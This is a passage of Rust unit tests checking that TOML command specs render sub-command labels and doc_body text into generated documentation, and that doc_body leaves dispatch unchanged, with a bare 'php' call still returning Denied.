        assert!(
            doc.description.contains("--type"),
            "fallback valued flags must render: {}",
            doc.description,
        );
        assert!(
            doc.description.contains("must look like a path"),
            "positional_shape must render: {}",
            doc.description,
        );
    }

    #[test]
    fn handler_sub_with_doc_body_renders_in_parent_body() {
        let spec = load_one(r#"
            [[command]]
            name = "demo"
            bare = false
            [[command.sub]]
            name = "rare-mode"
            handler = "demo_sub"
            doc_body = "requires --opt with one of red, green, blue"
        "#);
        let doc = spec.to_command_doc();
        assert!(
            doc.description.contains("**rare-mode**"),
            "body missing sub label: {}",
            doc.description,
        );
        assert!(
            doc.description.contains("requires --opt"),
            "body missing sub doc_body: {}",
            doc.description,
        );
    }

    #[test]
    fn handler_sub_without_doc_body_renders_label_only() {
        let spec = load_one(r#"
            [[command]]
            name = "demo"
            bare = false
            [[command.sub]]
            name = "rare-mode"
            handler = "demo_sub"
        "#);
        let doc = spec.to_command_doc();
        assert!(
            doc.description.contains("**rare-mode**"),
            "body missing sub label: {}",
            doc.description,
        );
    }

    #[test]
    fn doc_body_does_not_affect_dispatch_for_handler_command() {
        // Sanity-check: doc_body is purely a docs concern; the handler
        // is still what gets dispatched. We use a known handler (php)
        // because tests can't register new handlers at runtime.
        let spec = load_one(r#"
            [[command]]
            name = "php"
            handler = "php"
            doc_body = "anything here"
        "#);
        // bare php still denied via the handler
        assert_eq!(
            super::dispatch_spec(&toks(&["php"]), &spec),
            Verdict::Denied,
        );
    }
